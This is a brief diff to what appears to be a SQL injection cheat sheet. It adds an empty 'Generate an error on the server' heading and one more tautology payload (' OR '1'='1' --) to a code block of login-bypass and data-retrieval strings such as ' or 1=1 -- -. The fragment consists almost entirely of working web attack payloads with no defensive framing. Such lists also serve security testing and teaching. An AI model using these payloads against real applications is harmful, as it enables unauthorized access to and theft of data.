@@ -14,12 +14,15 @@ graph TD;
 
 # Payloads
 
+## Generate an error on the server
+
 ## Retriving hidden data
 ```sql
 ' or 1=1 -- -
 ' or 1=1-- -
 ' or 1=1--
 ' OR '1'='1
+' OR '1'='1' --
 ' --
 
 ```
